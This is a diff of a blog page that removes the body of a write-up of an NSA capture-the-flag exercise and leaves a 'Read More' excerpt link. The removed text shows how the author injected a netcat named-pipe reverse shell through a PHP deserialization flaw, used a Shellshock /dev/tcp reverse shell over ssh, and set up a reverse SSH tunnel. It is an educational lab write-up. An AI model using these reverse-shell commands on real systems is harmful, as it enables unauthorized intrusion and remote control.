-<p>Here we go. I first set up a netcat listener on port 9999 on my computer with <code>nc -l -p 9999</code>. Netcat is the Swiss Army knife of networking. One thing it can do is open a listening port on my machine, which then receives data sent to the port and can send data back to a connecting client.</p>
-<p><img src="/images/2017/09/ncat.png" alt="Netcat reverse shell"></p>
-<p>Let’s take a look at the commands I’m going to inject into the web server:</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f</div><div class="line">mkfifo /tmp/f</div><div class="line">cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc [my ip address] 9999 &gt; /tmp/f</div></pre></td></tr></table></figure></p>
-<p>I first create a named pipe called <code>/tmp/f</code>, which acts like a first-in first-out queue. Anything sent to this file-like object will be read out in the order that it came in.</p>
-<p>Now the last command. The <code>/bin/sh -i</code> creates an interactive shell, which is sent with netcat to my IP address on port 9999 and displayed on my terminal. Whatever commands I type on my local machine are directed to <code>/tmp/f</code> with the <code>&gt; /tmp/f</code>. I read in from <code>/tmp/f</code> with <code>cat</code> and pipe the contents to the shell, which executes them in my reverse shell.</p>
-<p>I could have done this without the named pipe using an option that’s built into netcat, but is often disabled for obvious security reasons — <code>nc –e /bin/sh</code>. The <code>-e</code> option executes the program after the netcat connection is made.</p>
-<p>But how do I get the web server to run these commands? Well, what’s sent to the server when I login to the app is a serialized User cookie in the user_data parameter. The User object is defined in the user.php file. It so happens that there’s a vulnerable function in the User class called array_filter that executes a string as a function.</p>
-<p>I grab this user object with Burp and modify it — I add in my list of commands, making sure that array_filter will be called by changing the array_filter value as well.</p>
-<p>To get the server to accept my evil User object, I use the cookies.inc file to generate a browser cookie from my object and sign it. After forwarding this cookie to the app, I look at my netcat listener, and it appears I have a shell!</p>
-<p>Now, I get onto the remote git server, which is defined in the <code>.gitconfig</code> file as having IP <code>10.1.9.88</code>.</p>
-<p>I locate an RSA private key on the webpage, which allows me to open a Secure Shell (ssh) to the git server. But if the git server’s ssh is configured so that I can’t execute any command I want, I can get around that with the Shellshock vulnerability.</p>
-<p>Shellshock is an error in Bash shell function definitions. Normally we define a function like <code>some_name() { [some_command] };</code>. In versions of Bash before September 2014, you could add an arbitrary command after the closing of the function definition, and instead of being ignored, it would be executed independently of the function.</p>
-<p>I open another netcat listener on my machine on port 9998.</p>
-<p>I run <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/gitlabkey git@10.1.9.88 ‘() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/[my IP address]/9998 0&lt;&amp;1</code>.</p>
-<p>Let’s break it down. <code>-o StrictHostkeyChecking=no</code> means that ssh won’t prompt a user to verify that we want to connect, which is standard for new connections. <code>-o UserKnownHostsFile=/dev/null</code> prevents our machine’s hostkey from being added to a file; <code>/dev/null</code> throws away anything written to it.</p>
-<p>Then, I take advantage of Shellshock. I have an empty function definition with <code>() { :; };</code>, and anything after it will be executed. I create a bash interactive shell that I send across the network to my own machine. <code>&gt;&amp;</code> redirects output and errors to the TCP connection and <code>0&lt;&amp;1</code> redirects the TCP tunnel to standard input. So, my netcat listener now has a reverse shell that executes the commands I type and returns the output to me.</p>
-<p>Finally, getting onto the build server from my Kali machine is done simply with a reverse SSH tunnel.</p>
-<p>From the Git server, I run <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -R 8080:10.9.1.56:80 root:[my ip address]</code>.</p>
-<p>The <code>-R</code> option specifies I want to make a reverse tunnel — the tunnel will bridge my local machine and the build server by routing traffic through the Git server. It’s called a reverse tunnel because I’m opening the tunnel on the Git server, but the entry point is on my Kali box. Port 8080 is the port on my machine that’s listening. IP <code>10.9.1.56</code> is the build server and port 80 is the port on the build server.</p>
-<p><img src="/images/2017/09/reverse.png" alt="Reverse SSH Tunnel (image from chamibuddhika.wordpress.com)"></p>
-<p>One would need a reverse SSH tunnel if the build server is behind a firewall and is only reachable from the Git server. I can’t access either the Git server or the build server directly, unless I set up a reverse tunnel from the Git server that allows me access.</p>
-<p>Now, if I connect to <code>localhost:8080</code>, I can browse the build server. To run arbitrary commands, I can add them to a scheduled build.</p>
-<p>After two days of exploring BWP’s systems, I’ve been able to testing all of my hacking and problem-solving chops. With an expertise in Windows, I could have racked up some more points. Level 4, which I skipped, is all about Windows domain controllers, which are servers that allow user access to resources in a Windows workgroup. First, I would have to get access to the file system and then locate some admin credentials. Then, I could use the metasploit exploit <code>/windows/smb/psexec</code> to get full control of the server and dump its stored passwords.</p>
-<p>But it was quite a well-designed and thorough CTF by the NSA. They’re letting newcomers learn the ropes in Levels 1-3 and distinguishing the best hackers in Levels 4 and 5.</p>
-
+        <!-- This is my first writeup, written in 2015 in Word and back-dated
+Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corpora......  -->
+        <p class="article-more-link">
+          <a href="/2015/12/12/NSA-Cybersprint-2015/#more">Read More</a>
+        </p>
       
     </div>
     
